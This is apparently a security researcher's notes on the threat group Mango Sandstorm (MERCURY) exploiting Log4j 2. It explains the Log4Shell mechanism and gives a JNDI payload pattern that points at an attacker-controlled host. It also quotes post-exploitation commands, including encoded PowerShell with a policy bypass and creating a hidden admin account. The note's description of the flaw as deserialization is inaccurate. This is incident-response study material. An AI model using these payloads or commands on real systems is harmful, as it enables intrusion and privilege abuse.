# Day 4 - Mango Sandstorm Attack techniques & insights
While I am tracing back the history of Mango Sandstorm, formerly known as MERCURY, I have a few questions, and I hope that these questions and my curiosity will help someone with their security incident response.

|#|Title|About|
|:---|:---|:---|
| Part 1 | [Day4-Mango-Sandstorm-Part1-Overview.md](https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day4-Mango-Sandstorm-Part1-Overview.md)   | Mango Sandstorm overview |
| Part 2 | Day4-Mango-Sandstorm-Part2-AttackTechniques-Insights.md  |August 25, 2022, Mango Sandstorm |
| Part 3 | [Day4-Mango-Sandstorm-Part3-AttackTechniques-Insights.md](https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day4-Mango-Sandstorm-Part3-AttackTechniques-Insights.md) |April 7, 2023, Mango Sandstorm & Storm-1084 |

## August 25, 2022, Mango Sandstorm
#### Short Summary
Mango Sandstorm, previously known for using Log4j 2 exploits to attack VMware apps, has recently been targeting SysAid apps using the same technique. Once they gain initial access, the group establishes persistence, moves laterally within the network using custom and well-known hacking tools, and dumps credentials.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/f67bb7ac-2cc3-4a6e-ab31-06b8db9ce991)
> [!Note]
> [MERCURY leveraging Log4j 2 vulnerabilities in unpatched systems to target Israeli organizations](https://www.microsoft.com/en-us/security/blog/2022/08/25/mercury-leveraging-log4j-2-vulnerabilities-in-unpatched-systems-to-target-israeli-organizations/)


## Log4j 2 vulnerability
As the Mango Sandstorm attack was initiated through the Log4j vulnerability, let's delve deeper into the attack and the vulnerability.

![image](https://github.com/LearningKijo/SecurityResearcher-Note/assets/120234772/49b682a4-10a9-4b9b-be53-a0c80e00d01b)
> [Remediating the Log4j vulnerability](https://www.youtube.com/watch?v=ulOTK2pZLNU) | Microsoft Defender for Endpoint

#### What is Log4j?
Log4j is a widely used Java logging library that allows developers to log events and messages in their applications. It provides flexibility in categorizing and controlling logging output, enabling effective debugging and monitoring of applications.

#### Why was Log4j 2 exploited?
Log4j 2, an updated version of Log4j, is a widely used and powerful logging framework in Java. However, it had a critical vulnerability called Log4Shell (CVE-2021-44228, CVE-2021-45046, CVE-2021-44832), ***which allowed attackers to remotely execute code by exploiting its deserialization functionality.*** 

#### How does the attacker precisely exploit the vulnerable Log4j 2? 
Attackers exploit vulnerable Log4j 2 systems by sending data containing a specific string. Log4j 2, while attempting to process this string, accesses ***a specified URL through the JNDI Lookup feature***. This allows attackers to download and execute malicious Java code within the system.
> [!Note]
> Java Naming and Directory Interface (JNDI) <br>
> It is a Java API that helps applications find and access data and resources using names.

#### A specified URL?
Here is the pattern of attack - **${indi:ldap//[attacker site]/a}**

e.g.
```
${indi:http//learningkijo.com/sub}
```

#### What commands were executed through the Log4j 2 exploit?
```cmd
cmd.exe /C whoami
cmd.exe /C powershell -exec bypass -w 1 -enc UwB….
cmd.exe /C hostname
cmd.exe /C ipconfig /all
cmd.exe /C net user
cmd.exe /C net localgroup administrators
cmd.exe /C net user admin * /add
cmd.exe /C net localgroup Administrators admin /add
cmd.exe /C quser
```
## Reference
1. [Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability](https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)
2. [Log4j (CVE-2021-44228) RCE Vulnerability Explained](https://www.youtube.com/watch?v=0-abhd-CLwQ)

#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.
